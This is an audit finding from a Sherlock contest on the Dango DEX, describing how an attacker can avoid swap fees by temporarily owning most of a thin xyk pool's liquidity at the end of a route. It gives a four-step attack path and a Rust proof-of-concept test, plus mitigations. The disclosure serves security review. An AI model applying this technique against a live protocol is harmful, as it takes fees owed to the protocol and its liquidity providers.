# M-7: Attacker can exploit thin liquidity in xyk pool to save on fees.

## Summary
The report discusses a bug found by a user named dandan. The bug allows an attacker to exploit a `PassiveLiquidity::Xyk` pair with thin liquidity to save on fees during instant swaps. This is done by depositing a large amount of liquidity in the last pool of the swap route, swapping the desired token, and then withdrawing the majority of the liquidity, resulting in a smaller fee. The protocol loses funds as it does not receive the full amount of fees. The root cause is that the fee is calculated from the output of the last pool in the route. To mitigate this issue, options such as charging fees from the input amount or in every step of the route can be considered.

## Details
Source: https://github.com/sherlock-audit/2025-09-dango-dex-judging/issues/324 

## Found by 
dandan

### Summary

Because fees on instant swaps with `swap_exact_amount_[in|out]` is calculated from the output of the last pool in the route, an attacker can exploit a `PassiveLiqudity::Xyk` pair with relatively thin liquidity compared to the size of the trade to save on fees. 

Example:

Attacker wants to make a large ETH -> USDC swap and DANGO/USDC pool has relatively thin liquidity compared to the size of the swap.

Thus swapping with a route of `[ ETH/USDC, DANGO/USDC ]` (meaning `ETH -> USDC -> DANGO`) would incur large slippage in the last pool, and as the fee is calculated from the output of the last pair, the fee would be too small compared to the size of the trade.
If the attacker deposits a large amount of liquidity in the last pool before making the trade, so that they own the majority of the liquidity in this pool, they can retrieve most of the output without paying any fees by simply withdrawing the liquidity after the swap.
They can then swap the remaining `DANGO` for `USDC` to reverse the slippage, but despite the output of this swap being relatively large compared to the input, as they have already pulled out most of the funds by withdrawing their liquidity, the total fees will still be less than what they should have paid.

Ultimately, this exploit results in a larger amount of `USDC` for the attacker than if they had just swapped `[ ETH/USDC ]` due to avoiding paying part of the fee, causing an equivalent loss for the protocol.

This is demonstrated in the PoC below.

### Root Cause

Fee is calculated from output of last pool in route:

https://github.com/sherlock-audit/2025-09-dango-dex/blob/main/left-curve/dango/dex/src/core/router.rs#L18-L54

### Internal Pre-conditions

A `PassiveLiquidity::Xyk` pool with relatively thin liquidity.

### External Pre-conditions

None

### Attack Path

Let token A be the token that attacker wants to swap for.  
Let pool P be a `PassiveLiquidity::Xyk` pool with tokens A/B and relatively thin liquidity.

1. Attacker deposits liquidity in pool P to own a majority of the lp share.
1. Attacker swaps through a route that ends with an output of token B in pool P.
1. Attacker withdraws all of their pool P liquidity.
1. Attacker swaps their remaining amount of token B for token A in pool P.

### Impact

Loss of funds for the protocol as it does not get the full amount of fees.

### PoC

Paste this in [dango/testing/tests/dex.rs](https://github.com/sherlock-audit/2025-09-dango-dex/blob/main/left-curve/dango/testing/tests/dex.rs) and run with `cargo test --package dango-testing --test dex -- cheat_fees_with_slippage --show-output`

```rust
fn cheat_fees_with_slippage(is_cheating: bool, expected_attacker_usdc_gain: Uint128) {
    let (mut suite, mut accounts, _, contracts, _) = setup_test_naive(Default::default());

    suite.balances().record_many(accounts.users());

    let attacker_initial_balances = suite.query_balances(&accounts.user1).unwrap();

    let eth_usdc_lp_denom = Denom::try_from("dex/pool/eth/usdc").unwrap();
    let dango_usdc_lp_denom = Denom::try_from("dex/pool/dango/usdc").unwrap();

    let swap_fee = Udec128::new_permille(5);

    let pool_type = PassiveLiquidity::Xyk(Xyk {
        spacing: Udec128::ONE,
        reserve_ratio: Bounded::new_unchecked(Udec128::ZERO),
        limit: 10,
    });

    // Owner creates ETH/USDC pool
    suite
        .query_wasm_smart(contracts.dex, dex::QueryPairRequest {
            base_denom: eth::DENOM.clone(),
            quote_denom: usdc::DENOM.clone(),
        })
        .should_succeed_and(|_| {
            // Update pair params
            suite
                .execute(
                    &mut accounts.owner,
                    contracts.dex,
                    &dex::ExecuteMsg::Owner(dex::OwnerMsg::BatchUpdatePairs(vec![PairUpdate {
                        base_denom: eth::DENOM.clone(),
                        quote_denom: usdc::DENOM.clone(),
                        params: PairParams {
                            lp_denom: eth_usdc_lp_denom.clone(),
                            bucket_sizes: BTreeSet::new(),
                            swap_fee_rate: Bounded::new_unchecked(swap_fee),
                            pool_type: pool_type.clone(),
                            min_order_size: Uint128::ZERO,
                        },
                    }])),
                    Coins::new(),
                )
                .should_succeed();
            true
        });

    // Owner creates Dango/USDC pool
    suite
        .query_wasm_smart(contracts.dex, dex::QueryPairRequest {
            base_denom: dango::DENOM.clone(),
            quote_denom: usdc::DENOM.clone(),
        })
        .should_succeed_and(|_| {
            // Update pair params
            suite
                .execute(
                    &mut accounts.owner,
                    contracts.dex,
                    &dex::ExecuteMsg::Owner(dex::OwnerMsg::BatchUpdatePairs(vec![PairUpdate {
                        base_denom: dango::DENOM.clone(),
                        quote_denom: usdc::DENOM.clone(),
                        params: PairParams {
                            lp_denom: dango_usdc_lp_denom.clone(),
                            bucket_sizes: BTreeSet::new(),
                            swap_fee_rate: Bounded::new_unchecked(swap_fee),
                            pool_type: pool_type.clone(),
                            min_order_size: Uint128::ZERO,
                        },
                    }])),
                    Coins::new(),
                )
                .should_succeed();
            true
        });

    // Register the oracle prices
    let oracle_prices = vec![
        (eth::DENOM.clone(), Udec128::new(4000)),
        (dango::DENOM.clone(), Udec128::new(1)),
        (usdc::DENOM.clone(), Udec128::new(1)),
    ];

    for (denom, price) in oracle_prices {
        suite
            .execute(
                &mut accounts.owner,
                contracts.oracle,
                &oracle::ExecuteMsg::RegisterPriceSources(btree_map! {
                    denom => PriceSource::Fixed {
                        humanized_price: price,
                        precision: 6,
                        timestamp: Timestamp::from_seconds(1730802926),
                    },
                }),
                Coins::new(),
            )
            .should_succeed();
    }

    // Owner provides some initial liquidity

    let initial_eth_usdc_liquidity_funds = coins! {
        eth::DENOM.clone() => 10,
        usdc::DENOM.clone()  => 40_000_000_000,
    };

    suite
        .execute(
            &mut accounts.owner,
            contracts.dex,
            &dex::ExecuteMsg::ProvideLiquidity {
                base_denom: eth::DENOM.clone(),
                quote_denom: usdc::DENOM.clone(),
            },
            initial_eth_usdc_liquidity_funds.clone(),
        )
        .should_succeed();

    // Relatively liquidity for DANGO/USDC pool
    let initial_dango_usdc_liquidity_funds = coins! {
        dango::DENOM.clone() => 100,
        usdc::DENOM.clone()  => 100,
    };

    suite
        .execute(
            &mut accounts.owner,
            contracts.dex,
            &dex::ExecuteMsg::ProvideLiquidity {
                base_denom: dango::DENOM.clone(),
                quote_denom: usdc::DENOM.clone(),
            },
            initial_dango_usdc_liquidity_funds.clone(),
        )
        .should_succeed();

    let eth_swap_amount = Uint128::new(1);

    let eth_usdc_swap_funds = coins! {
        eth::DENOM.clone() => eth_swap_amount.clone(),
    };

    if is_cheating {
        let attacker_dango_usdc_liquidity_funds = coins! {
            dango::DENOM.clone() => 9900,
            usdc::DENOM.clone()  => 9900,
        };

        suite
            .execute(
                &mut accounts.user1,
                contracts.dex,
                &dex::ExecuteMsg::ProvideLiquidity {
                    base_denom: dango::DENOM.clone(),
                    quote_denom: usdc::DENOM.clone(),
                },
                attacker_dango_usdc_liquidity_funds.clone(),
            )
            .should_succeed();

        let route = vec![PairId {
            base_denom: eth::DENOM.clone(),
            quote_denom: usdc::DENOM.clone(),
        }, PairId {
            base_denom: dango::DENOM.clone(),
            quote_denom: usdc::DENOM.clone(),
        }];

        suite
            .execute(
                &mut accounts.user1,
                contracts.dex,
                &dex::ExecuteMsg::SwapExactAmountIn {
                    route: MaxLength::new_unchecked(UniqueVec::new_unchecked(route.clone())),
                    minimum_output: None,
                },
                eth_usdc_swap_funds.clone(),
            )
            .should_succeed();

        suite.balances().record_many(accounts.users());
        let attacker_withdrawal_funds = coins! {
            dango_usdc_lp_denom.clone()  => suite.query_balances(&accounts.user1).unwrap().amount_of(&dango_usdc_lp_denom)
        };

        suite
            .execute(
                &mut accounts.user1,
                contracts.dex,
                &dex::ExecuteMsg::WithdrawLiquidity {
                    base_denom: dango::DENOM.clone(),
                    quote_denom: usdc::DENOM.clone(),
                },
                attacker_withdrawal_funds.clone(),
            )
            .should_succeed();

        suite.balances().record_many(accounts.users());

        let dango_usdc_swap_funds = coins! {
            dango::DENOM.clone() => suite
                .query_balances(&accounts.user1).unwrap().amount_of(&dango::DENOM)
                .checked_sub(attacker_initial_balances.amount_of(&dango::DENOM))
                .unwrap(),
        };

        let route = vec![PairId {
            base_denom: dango::DENOM.clone(),
            quote_denom: usdc::DENOM.clone(),
        }];

        suite
            .execute(
                &mut accounts.user1,
                contracts.dex,
                &dex::ExecuteMsg::SwapExactAmountIn {
                    route: MaxLength::new_unchecked(UniqueVec::new_unchecked(route.clone())),
                    minimum_output: None,
                },
                dango_usdc_swap_funds.clone(),
            )
            .should_succeed();
    } else {
        let route = vec![PairId {
            base_denom: eth::DENOM.clone(),
            quote_denom: usdc::DENOM.clone(),
        }];

        suite
            .execute(
                &mut accounts.user1,
                contracts.dex,
                &dex::ExecuteMsg::SwapExactAmountIn {
                    route: MaxLength::new_unchecked(UniqueVec::new_unchecked(route.clone())),
                    minimum_output: None,
                },
                eth_usdc_swap_funds.clone(),
            )
            .should_succeed();
    }

    suite.balances().record_many(accounts.users());

    let balances = suite.query_balances(&accounts.user1).unwrap();

    let eth_loss = attacker_initial_balances.amount_of(&eth::DENOM)
        .checked_sub(balances.amount_of(&eth::DENOM))
        .unwrap();

    let usdc_gain = balances
        .amount_of(&usdc::DENOM)
        .checked_sub(attacker_initial_balances.amount_of(&usdc::DENOM))
        .unwrap();

    let dango_delta = balances
        .amount_of(&dango::DENOM)
        .checked_sub(attacker_initial_balances.amount_of(&dango::DENOM))
        .unwrap();

    println!("ETH loss: {}", eth_loss);
    println!("USDC gain: {}", usdc_gain);
    println!("DANGO delta: {}", dango_delta);

    assert_eq!(eth_loss, eth_swap_amount);
    assert_eq!(dango_delta, Uint128::ZERO);
    assert_eq!(usdc_gain, expected_attacker_usdc_gain);
}
```

### Mitigation

Some options include:
- Charge fee from input amount
- Charge fee in every step of route
